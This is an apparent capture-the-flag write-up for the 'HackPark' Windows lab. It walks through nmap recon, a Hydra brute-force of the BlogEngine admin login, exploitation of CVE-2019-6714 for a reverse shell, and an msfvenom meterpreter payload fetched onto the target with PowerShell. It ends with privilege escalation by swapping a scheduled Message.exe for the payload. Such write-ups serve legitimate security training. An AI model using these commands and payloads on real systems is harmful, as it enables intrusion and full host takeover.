# HackPark

## Recon 

`nmap -A -T4 -Pn 10.48.136.150`

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 8.5
|_http-title: hackpark | hackpark amusements
|_http-server-header: Microsoft-IIS/8.5
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
| http-methods: 
|_  Potentially risky methods: TRACE
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2026-01-26T00:16:23
|_Not valid after:  2026-07-28T00:16:23
|_ssl-date: 2026-01-27T00:25:06+00:00; +15s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: HACKPARK
|   NetBIOS_Domain_Name: HACKPARK
|   NetBIOS_Computer_Name: HACKPARK
|   DNS_Domain_Name: hackpark
|   DNS_Computer_Name: hackpark
|   Product_Version: 6.3.9600
|_  System_Time: 2026-01-27T00:25:01+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
# Enumeration 

User Enumeration 
```
Administrator
visitor1
```

# Bruteforcing with Hydra
`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.136.150 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=ICy8Y0csiq7JkKYYxGt8%2Fn1XYnaM54axhAtWBxv0niwBT%2B%2BJoYo1Hst7jpGTMN18fDvIt64IHAhCwRReuy%2BfZ72r%2FfqEge7%2Bsq2oCQc%2F9gQKFLWdmCbG6IJB4C6P4gZBTO4fjtLjdO%2B%2BAyIfSZ0ajRi7CWR%2FwZhqkVBuJ5tHMLOUHy6n&__EVENTVALIDATION=ySD4xLOjMvwkFsGrTAj9VOHeCGtLHxkZ2G9BN7LDy7zj%2F5fhOotK6vSMET3FC4AM9IqEsCAik7dy6RNnmvGgT9JaasQGLNlBLMHydGYsdpa1geZH5C%2Fmm8jx%2FFEOrFHf43DF3sJggnZeA8uPcrUoU33sUW%2BXQOQn%2F8%2BwPjaUMmr4RBmS&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Login failed" -V`

`[80][http-post-form] host: 10.48.136.150   login: admin   password: 1qaz2wsx`

# Initial Access

Login as admin with password 1qaz2wsx 

Version detection: 3.3.6

ExploitDB search => BlogEngine 3.3.6

CVE-2019-6714 = A path traversal vulnerability leading to RCE for BlogEngine <= 3.3.6, where an unchecked parameter "theme" is used to override the default theme for blog pages. 

- TcpClient address and port is set to the attacker machine, with a listener waiting for a revshell connection 
- File is uploaded as `PostView.ascx` through the file manager to `http://10.48.136.150/admin/app/editor/editpost.cshtml` 
- The file will be located in the `/App_Data/files directory from the document root: `http://10.82.129.217/theme=../../App_Data/files`

`whoami` => `iis apppool\blog`

# Windows Privilege Escalation

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.8 LPORT=4444 -f exe > shell.exe`

On target machine: 
`powershell -c "Invoke-WebRequest -Uri 'http://192.168.174.8/shell.exe' -OutFile 'C:/Windows/Temp/shell.exe'" 
`cd C:/Windows/Temp`
`.\shell.exe' 

WinPEAS is located at `/usr/share/peass/winpeas/winPEAS.bat` via `locate *winPEAS*`

# PrivEsc

Winpeas => Enumerates WScheduler, means that there are scheduled tasks that may be running 

Looking at the log, it indicates that Message.exe is running every 30s

cd C:\Program Files (x86)\SystemScheduler 

upload shell.exe
mv Message.exe Message.bak
mv shell.exe Message.exe

Root obtained
